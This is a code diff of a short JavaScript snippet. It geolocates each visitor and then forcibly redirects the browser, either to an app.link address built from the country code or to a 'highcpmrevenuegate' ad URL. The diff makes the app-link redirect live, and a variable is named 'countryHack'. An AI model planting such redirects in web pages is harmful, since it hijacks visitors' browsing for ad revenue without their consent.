@@ -1,5 +1,4 @@
-<script>
-let countryHack = ['MX', 'DO', 'FJ', 'BR', 'PL', 'RS', 'HR', 'ME', 'MJ', 'GE', 'GT', 'AU', 'NZ']; //país
+let countryHack = ['MX', 'DO', 'FJ', 'BR', 'PL', 'RS', 'HR', 'ME', 'MJ', 'GE', 'GT', 'AU', 'NZ']; //pais
 let urlPromocion = 'https://www.highcpmrevenuegate.com/x293k2w3xc?key=c756c8fb361df5df079ee02588e59baa';
 let country;
 
@@ -11,13 +10,15 @@ fetch('https://get.geojs.io/v1/ip/country')
         redirectURL(country)
     })
 
+
 function redirectURL(country) {
     if (country) {
-        console.log('https://yuy4o.app.link/0fkXSJqnaCb' + country)
+        let newUrl = 'https://yuy4o.app.link/0fkXSJqnaCb' + country;
+        window.location.href = newUrl;
+        
+        console.log(newUrl)
     } else {
         window.location.href = urlPromocion;
         console.log('REDIRECT ADS...' + country)
     }
 }
-
-</script>
